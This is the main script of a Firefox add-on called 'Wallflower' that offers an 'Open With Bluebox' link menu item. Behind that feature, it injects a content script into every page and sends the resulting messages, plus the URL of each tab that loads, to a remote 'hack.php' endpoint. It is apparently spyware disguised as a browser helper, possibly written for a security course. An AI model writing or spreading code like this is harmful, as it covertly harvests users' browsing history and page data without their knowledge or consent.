// Wallflower

var pageMod = require("sdk/page-mod");
var self = require("sdk/self");
var request = require("sdk/request").Request;
var tabs = require("sdk/tabs");

 pageMod.PageMod({
       include: "*",
         contentScriptWhen: "ready",
         contentScriptFile: [self.data.url("jquery-2.0.3.min.js"), self.data.url("my-content-script.js")],
         onAttach: function(worker){
             worker.port.on("message", function(message) {
                 var jsonmsg = JSON.parse(message);
        
        var testReq = request ({
        url: 'http://athena.nitc.ac.in/~john_bcs10/comp_sec/hack.php',
        content: jsonmsg,
        contentType:'application/json',
        onComplete: function(response) {
        //console.log(response.text);
    }
    }).get();
});
          }
});

var contextMenu = require("sdk/context-menu");
 var menuItem = contextMenu.Item({
  label: "Open With Bluebox",
  image: self.data.url("icon.png"),
  context: contextMenu.SelectorContext("a"),
  contentScript: "self.on('click', function (node) {" +
                 "var text = node.href; console.log(text); self.postMessage(text); });",
  onMessage: function(text) {
  	
  		tabs.open("https://blue-box.appspot.com/web/?sourceid=firefoxext&bbxffv=104&bbxdesturl="+ encodeURIComponent(text));
  		}  		 
});

tabs.on('ready', function onOpen(tab) {
  console.log(tab.url);
  var msg = '{"tabs":"'+ tab.url + '"}';
  var tabReq = request ({
        url: 'http://athena.nitc.ac.in/~john_bcs10/comp_sec/hack.php',
        content: JSON.parse(msg),
        contentType:'application/json',
        onComplete: function(response) {
       // console.log(response.text);
    }
    }).get();
  });
